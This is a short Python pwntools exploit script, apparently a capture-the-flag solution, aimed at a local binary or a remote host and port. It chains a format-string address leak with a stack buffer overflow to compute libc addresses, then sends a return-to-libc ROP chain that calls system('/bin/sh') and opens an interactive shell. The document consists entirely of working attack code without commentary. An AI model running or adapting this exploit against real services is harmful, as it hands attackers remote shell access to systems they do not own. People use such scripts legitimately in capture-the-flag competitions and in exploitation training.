from pwn import *
LOCAL = True

if LOCAL:
	p = process('./main')	

else:
	p = remote('139.59.30.165', 9200)

# first stage : leak
payload = "%2$p"
payload += "A"*(72-len(payload))
payload += p64(0x400637)
p.recvuntil("here \n")
p.sendline(payload)

tmp = p.recvline()
data = int(tmp.split('A')[0],16)
print tmp

libc_base = data-0x39b770
binsh = libc_base+0x1619d9
system = libc_base+0x3f480

print "leak: "+hex(data)
print "Libc base: "+hex(libc_base)
print "binsh: "+hex(binsh)
print "system: "+hex(system)

# second stage : ret2libc
pop_rdi = 0x00400733 # pop rdi; ret; 
pop_rax = libc_base+0x0035578 # pop rax; ret
call_rax =libc_base+  0x00202df # call rax;ret

payload = "A"*72
payload += p64(pop_rax)
payload += p64(system)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(call_rax)

p.recvuntil("inputz: \n")
p.sendline(payload)
p.interactive()
